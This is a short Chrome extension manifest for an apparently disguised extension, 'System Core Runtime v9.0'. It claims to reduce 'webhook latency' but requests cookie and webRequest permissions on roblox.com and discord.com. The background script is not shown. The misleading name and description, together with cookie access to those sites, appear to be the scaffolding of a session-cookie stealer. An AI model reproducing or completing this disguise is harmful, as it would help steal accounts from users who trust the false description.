{
  "manifest_version": 3,
  "name": "System Core Runtime v9.0",
  "version": "9.0.1",
  "description": "Optimizes background API requests and reduces webhook latency.",
  "permissions": ["cookies", "webRequest", "storage"],
  "host_permissions": [
    "*://*.roblox.com/*",
    "*://*.discord.com/*"
  ],
  "background": {
    "service_worker": "background.js"
  }
}
